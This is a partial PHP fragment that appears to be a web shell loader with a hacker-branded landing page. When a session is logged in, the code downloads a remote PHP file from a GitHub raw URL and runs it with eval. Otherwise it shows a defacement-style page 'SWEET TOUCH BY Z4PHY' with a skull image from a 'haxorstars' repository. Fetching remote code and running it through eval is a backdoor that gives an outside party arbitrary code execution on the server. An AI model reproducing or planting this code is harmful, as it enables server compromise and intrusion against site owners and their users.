...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/z4p-priv.php');
    eval('?>' . $a);
} else {
    ...
    <html>
    <head>
        <title>~!Hello World! SWEET TOUCH BY Z4PHY~!</title>
    </head>
    <body>
      <style>
      body {
      ...
      align-items: center;
      background: url('https://raw.githubusercontent.com/haxorstars/archive/main/media/scleton.gif') no-repeat center center fixed;
